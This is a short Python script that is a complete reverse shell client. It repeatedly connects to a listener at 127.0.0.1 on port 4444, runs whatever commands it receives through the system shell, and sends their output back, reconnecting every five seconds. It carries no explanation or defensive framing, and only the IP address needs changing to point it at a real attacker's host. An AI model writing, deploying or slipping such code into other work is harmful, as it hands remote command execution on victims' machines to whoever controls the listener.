import socket
import subprocess
import os
import time

IP = "127.0.0.1"
PORT = 4444

def send_large_data(s, data):
    chunk_size = 1024
    for i in range(0, len(data), chunk_size):
        s.send(data[i:i+chunk_size].encode())
    s.send("END_OF_DATA".encode())

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((IP, PORT))

            while True:
                try:
                    command = s.recv(1024).decode()
                    if not command:
                        break
                    if command.lower() == "exit":
                        break
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output_data = output.stdout + output.stderr
                    send_large_data(s, output_data)
                except socket.timeout:
                    break
                except Exception as e:
                    break
            s.close()
        except socket.timeout:
            pass
        except Exception as e:
            pass
        time.sleep(5)

if __name__ == "__main__":
    connect()
